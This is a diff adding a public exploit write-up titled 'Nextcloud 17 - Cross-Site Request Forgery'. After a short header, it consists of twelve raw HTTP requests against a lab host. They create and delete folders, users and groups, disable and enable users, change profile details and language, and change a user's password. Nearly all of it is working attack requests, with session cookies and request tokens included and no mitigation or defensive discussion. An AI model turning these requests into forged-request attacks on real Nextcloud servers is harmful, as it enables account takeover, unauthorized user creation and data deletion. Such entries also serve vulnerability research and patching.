@@ -1,0 +1,314 @@
+# Exploit Title: Nextcloud 17 - Cross-Site Request Forgery
+# Date: 08.11.2019
+# Exploit Author: Ozer Goker
+# Vendor Homepage: https://nextcloud.com
+# Software Link: https://nextcloud.com/install/#instructions-server
+# Version: 17
+# CVE: N/A
+
+
+#Nextcloud offers the industry-leading, on-premises content collaboration
+platform.
+#Our technology combines the convenience and ease of use of consumer-grade
+solutions like Dropbox and Google Drive with the security, privacy and
+control business #needs.
+
+##################################################################################################################################
+
+# CSRF1
+# Create Folder
+
+MKCOL /remote.php/dav/files/ogoker/test HTTP/1.1
+Host: 192.168.2.109
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101
+Firefox/68.0
+Accept: /
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+requesttoken:
+NBxrV688w2KBVFx/Q+X7LsYUMGKGrj5PFNLDVe5R0bo=:ZXkTEoBkskmuOhU0NN2iab9welrLxlUkZqePH70zg/M=
+Connection: close
+Cookie: oc5a107a3xcz=6kkh1f4s3gu80pjk9iclagoqrp;
+oc_sessionPassphrase=W7gmobO%2FJ1ZdAmc4H7seQQvMpT%2BEwXBqNdYdwbq%2BE5P69EgB8188UUBBtMpcb6qmdLVr6t6iqzJ%2F%2F%2FqhDkt86%2FZg%2BSpjkyB9dO2qVLxXpVEZyBtJUj9TQfA6jrXqCA9t;
+__Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestrict=true;
+nc_username=ogoker; nc_token=BnzwpedGNoSh8RqQEcU7yAbb6O%2FQReCM;
+nc_session_id=6kkh1f4s3gu80pjk9iclagoqrp; redirect=1; testing=1
+
+
+##################################################################################################################################
+
+# CSRF2
+# Delete Folder
+
+DELETE /remote.php/dav/files/ogoker/test HTTP/1.1
+Host: 192.168.2.109
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101
+Firefox/68.0
+Accept: /
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+requesttoken:
+NBxrV688w2KBVFx/Q+X7LsYUMGKGrj5PFNLDVe5R0bo=:ZXkTEoBkskmuOhU0NN2iab9welrLxlUkZqePH70zg/M=
+Connection: close
+Cookie: oc5a107a3xcz=6kkh1f4s3gu80pjk9iclagoqrp;
+oc_sessionPassphrase=W7gmobO%2FJ1ZdAmc4H7seQQvMpT%2BEwXBqNdYdwbq%2BE5P69EgB8188UUBBtMpcb6qmdLVr6t6iqzJ%2F%2F%2FqhDkt86%2FZg%2BSpjkyB9dO2qVLxXpVEZyBtJUj9TQfA6jrXqCA9t;
+__Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestrict=true;
+nc_username=ogoker; nc_token=BnzwpedGNoSh8RqQEcU7yAbb6O%2FQReCM;
+nc_session_id=6kkh1f4s3gu80pjk9iclagoqrp; redirect=1; testing=1
+
+
+##################################################################################################################################
+
+# CSRF3
+# Create User
+
+POST /ocs/v2.php/cloud/users HTTP/1.1
+Host: 192.168.2.109
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101
+Firefox/68.0
+Accept: application/json, text/plain, /
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/json;charset=utf-8
+requesttoken:
+qmO6/Dw6+bFv8FXRaFdzbhhzcVHZIGBHtg5riOIp4es=:+wbCuRNiiJpAnhyaH28qKWEXO2mUSAssxHsnwrFLs6I=
+Content-Length: 129
+Connection: close
+Cookie: oc5a107a3xcz=6kkh1f4s3gu80pjk9iclagoqrp;
+oc_sessionPassphrase=W7gmobO%2FJ1ZdAmc4H7seQQvMpT%2BEwXBqNdYdwbq%2BE5P69EgB8188UUBBtMpcb6qmdLVr6t6iqzJ%2F%2F%2FqhDkt86%2FZg%2BSpjkyB9dO2qVLxXpVEZyBtJUj9TQfA6jrXqCA9t;
+__Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestrict=true;
+nc_username=ogoker; nc_token=BnzwpedGNoSh8RqQEcU7yAbb6O%2FQReCM;
+nc_session_id=6kkh1f4s3gu80pjk9iclagoqrp; redirect=1; testing=1
+
+{"userid":"test","password":"test1234","displayName":"","email":"","groups":[],"subadmin":[],"quota":"default","language":"en"}
+
+
+
+##################################################################################################################################
+
+# CSRF4
+# Delete User
+
+DELETE /ocs/v2.php/cloud/users/test HTTP/1.1
+Host: 192.168.2.109
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101
+Firefox/68.0
+Accept: application/json, text/plain, /
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+requesttoken:
+qmO6/Dw6+bFv8FXRaFdzbhhzcVHZIGBHtg5riOIp4es=:+wbCuRNiiJpAnhyaH28qKWEXO2mUSAssxHsnwrFLs6I=
+Connection: close
+Cookie: oc5a107a3xcz=6kkh1f4s3gu80pjk9iclagoqrp;
+oc_sessionPassphrase=W7gmobO%2FJ1ZdAmc4H7seQQvMpT%2BEwXBqNdYdwbq%2BE5P69EgB8188UUBBtMpcb6qmdLVr6t6iqzJ%2F%2F%2FqhDkt86%2FZg%2BSpjkyB9dO2qVLxXpVEZyBtJUj9TQfA6jrXqCA9t;
+__Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestrict=true;
+nc_username=ogoker; nc_token=BnzwpedGNoSh8RqQEcU7yAbb6O%2FQReCM;
+nc_session_id=6kkh1f4s3gu80pjk9iclagoqrp; redirect=1; testing=1
+
+
+##################################################################################################################################
+
+# CSRF5
+# Disable User
+
+PUT /ocs/v2.php/cloud/users/test/disable HTTP/1.1
+Host: 192.168.2.109
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101
+Firefox/68.0
+Accept: application/json, text/plain, /
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+requesttoken:
+3uInmrIiv0aGraTESlGJCzqadH5giusD5iZ/GZwxxEQ=:j4df3516zm2pw+2PPWnQTEP+PkYt4oBolFMzU89Tlg0=
+Connection: close
+Cookie: oc5a107a3xcz=6kkh1f4s3gu80pjk9iclagoqrp;
+oc_sessionPassphrase=W7gmobO%2FJ1ZdAmc4H7seQQvMpT%2BEwXBqNdYdwbq%2BE5P69EgB8188UUBBtMpcb6qmdLVr6t6iqzJ%2F%2F%2FqhDkt86%2FZg%2BSpjkyB9dO2qVLxXpVEZyBtJUj9TQfA6jrXqCA9t;
+__Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestrict=true;
+nc_username=ogoker; nc_token=BnzwpedGNoSh8RqQEcU7yAbb6O%2FQReCM;
+nc_session_id=6kkh1f4s3gu80pjk9iclagoqrp; redirect=1; testing=1
+Content-Length: 0
+
+
+##################################################################################################################################
+
+# CSRF6
+# Enable User
+
+PUT /ocs/v2.php/cloud/users/test/enable HTTP/1.1
+Host: 192.168.2.109
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101
+Firefox/68.0
+Accept: application/json, text/plain, /
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+requesttoken:
+3uInmrIiv0aGraTESlGJCzqadH5giusD5iZ/GZwxxEQ=:j4df3516zm2pw+2PPWnQTEP+PkYt4oBolFMzU89Tlg0=
+Connection: close
+Cookie: oc5a107a3xcz=6kkh1f4s3gu80pjk9iclagoqrp;
+oc_sessionPassphrase=W7gmobO%2FJ1ZdAmc4H7seQQvMpT%2BEwXBqNdYdwbq%2BE5P69EgB8188UUBBtMpcb6qmdLVr6t6iqzJ%2F%2F%2FqhDkt86%2FZg%2BSpjkyB9dO2qVLxXpVEZyBtJUj9TQfA6jrXqCA9t;
+__Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestrict=true;
+nc_username=ogoker; nc_token=BnzwpedGNoSh8RqQEcU7yAbb6O%2FQReCM;
+nc_session_id=6kkh1f4s3gu80pjk9iclagoqrp; redirect=1; testing=1
+Content-Length: 0
+
+
+##################################################################################################################################
+
+# CSRF7
+# Create Group
+
+POST /ocs/v2.php/cloud/groups HTTP/1.1
+Host: 192.168.2.109
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101
+Firefox/68.0
+Accept: application/json, text/plain, /
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/json;charset=utf-8
+requesttoken:
+EjdL6QpK1LpIlTtWYWHqEa3p8UKwRqDbBraFa+WWRbE=:Q1IzrCUSpZFn+3IdFlmzVtSNu3r9LsuwdMPJIbb0F/g=
+Content-Length: 18
+Connection: close
+Cookie: oc5a107a3xcz=6kkh1f4s3gu80pjk9iclagoqrp;
+oc_sessionPassphrase=W7gmobO%2FJ1ZdAmc4H7seQQvMpT%2BEwXBqNdYdwbq%2BE5P69EgB8188UUBBtMpcb6qmdLVr6t6iqzJ%2F%2F%2FqhDkt86%2FZg%2BSpjkyB9dO2qVLxXpVEZyBtJUj9TQfA6jrXqCA9t;
+__Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestrict=true;
+redirect=1; testing=1
+
+{"groupid":"test"}
+
+
+##################################################################################################################################
+
+# CSRF8
+# Delete Group
+
+DELETE /ocs/v2.php/cloud/groups/test HTTP/1.1
+Host: 192.168.2.109
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101
+Firefox/68.0
+Accept: application/json, text/plain, /
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+requesttoken:
+EjdL6QpK1LpIlTtWYWHqEa3p8UKwRqDbBraFa+WWRbE=:Q1IzrCUSpZFn+3IdFlmzVtSNu3r9LsuwdMPJIbb0F/g=
+Connection: close
+Cookie: oc5a107a3xcz=6kkh1f4s3gu80pjk9iclagoqrp;
+oc_sessionPassphrase=W7gmobO%2FJ1ZdAmc4H7seQQvMpT%2BEwXBqNdYdwbq%2BE5P69EgB8188UUBBtMpcb6qmdLVr6t6iqzJ%2F%2F%2FqhDkt86%2FZg%2BSpjkyB9dO2qVLxXpVEZyBtJUj9TQfA6jrXqCA9t;
+__Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestrict=true;
+redirect=1; testing=1
+
+
+##################################################################################################################################
+
+# CSRF9
+# Change User Full Name
+
+
+PUT /settings/users/ogoker/settings HTTP/1.1
+Host: 192.168.2.109
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101
+Firefox/68.0
+Accept: application/json, text/javascript, /; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/json
+requesttoken:
+nvnWCslz6So+9VRA8Vg8043tt1pf1wL/ysi2ak1J6es=:z5yuT+YrmAERmx0LhmBllPSJ/WISv2mUuL36IB4ru6I=
+OCS-APIREQUEST: true
+X-Requested-With: XMLHttpRequest
+Content-Length: 266
+Connection: close
+Cookie: oc5a107a3xcz=6kkh1f4s3gu80pjk9iclagoqrp;
+oc_sessionPassphrase=W7gmobO%2FJ1ZdAmc4H7seQQvMpT%2BEwXBqNdYdwbq%2BE5P69EgB8188UUBBtMpcb6qmdLVr6t6iqzJ%2F%2F%2FqhDkt86%2FZg%2BSpjkyB9dO2qVLxXpVEZyBtJUj9TQfA6jrXqCA9t;
+__Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestrict=true;
+redirect=1; testing=1
+
+{"displayname":"Ozer
+Goker","displaynameScope":"contacts","phone":"","phoneScope":"private","email":"","emailScope":"contacts","website":"","websiteScope":"private","twitter":"","twitterScope":"private","address":"","addressScope":"private","avatarScope":"contacts"}
+
+
+##################################################################################################################################
+
+# CSRF10
+# Change User Email
+
+PUT /settings/users/ogoker/settings HTTP/1.1
+Host: 192.168.2.109
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101
+Firefox/68.0
+Accept: application/json, text/javascript, /; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/json
+requesttoken:
+I+6bC+nRvx4TyTudd4pzZrOucr8qlgwe0YE3v13+fOw=:covjTsaJzjU8p3LWALIqIcrKOIdn/md1o/R79Q6cLqU=
+OCS-APIREQUEST: true
+X-Requested-With: XMLHttpRequest
+Content-Length: 271
+Connection: close
+Cookie: oc5a107a3xcz=6kkh1f4s3gu80pjk9iclagoqrp;
+oc_sessionPassphrase=W7gmobO%2FJ1ZdAmc4H7seQQvMpT%2BEwXBqNdYdwbq%2BE5P69EgB8188UUBBtMpcb6qmdLVr6t6iqzJ%2F%2F%2FqhDkt86%2FZg%2BSpjkyB9dO2qVLxXpVEZyBtJUj9TQfA6jrXqCA9t;
+__Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestrict=true;
+redirect=1; testing=1
+
+{"displayname":"ogoker","displaynameScope":"contacts","phone":"","phoneScope":"private","email":"test@test
+","emailScope":"contacts","website":"","websiteScope":"private","twitter":"","twitterScope":"private","address":"","addressScope":"private","avatarScope":"contacts"}
+
+
+##################################################################################################################################
+
+# CSRF11
+# Change Language
+
+PUT /ocs/v2.php/cloud/users/ogoker HTTP/1.1
+Host: 192.168.2.109
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101
+Firefox/68.0
+Accept: /
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+requesttoken:
+mRN2MXrwRQuE/fuQ5PNtyp4ulgYRocB99vbydSi8i+E=:yHYOdFWoNCCrk7Lbk8s0jedK3D5cyasWhIO+P3ve2ag=
+OCS-APIREQUEST: true
+X-Requested-With: XMLHttpRequest
+Content-Length: 21
+Connection: close
+Cookie: oc5a107a3xcz=6kkh1f4s3gu80pjk9iclagoqrp;
+oc_sessionPassphrase=W7gmobO%2FJ1ZdAmc4H7seQQvMpT%2BEwXBqNdYdwbq%2BE5P69EgB8188UUBBtMpcb6qmdLVr6t6iqzJ%2F%2F%2FqhDkt86%2FZg%2BSpjkyB9dO2qVLxXpVEZyBtJUj9TQfA6jrXqCA9t;
+__Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestrict=true;
+redirect=1; testing=1
+
+key=language&value=tr
+
+
+##################################################################################################################################
+
+# CSRF12
+# Change User Password
+
+POST /settings/personal/changepassword HTTP/1.1
+Host: 192.168.2.109
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101
+Firefox/68.0
+Accept: /
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+requesttoken:
+0OhP82O7tEe/0gbwiEPrkFfuU9StyaiXNi0yqg02wT4=:gY03tkzjxWyQvE+7/3uy1y6KGezgocP8RFh+4F5Uk3c=
+OCS-APIREQUEST: true
+X-Requested-With: XMLHttpRequest
+Content-Length: 70
+Connection: close
+Cookie: oc5a107a3xcz=6kkh1f4s3gu80pjk9iclagoqrp;
+oc_sessionPassphrase=W7gmobO%2FJ1ZdAmc4H7seQQvMpT%2BEwXBqNdYdwbq%2BE5P69EgB8188UUBBtMpcb6qmdLVr6t6iqzJ%2F%2F%2FqhDkt86%2FZg%2BSpjkyB9dO2qVLxXpVEZyBtJUj9TQfA6jrXqCA9t;
+__Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestrict=true;
+redirect=1; testing=1
+
+oldpassword=abcd1234&newpassword=12345678&newpassword-clone=12345678
+
+
+##################################################################################################################################
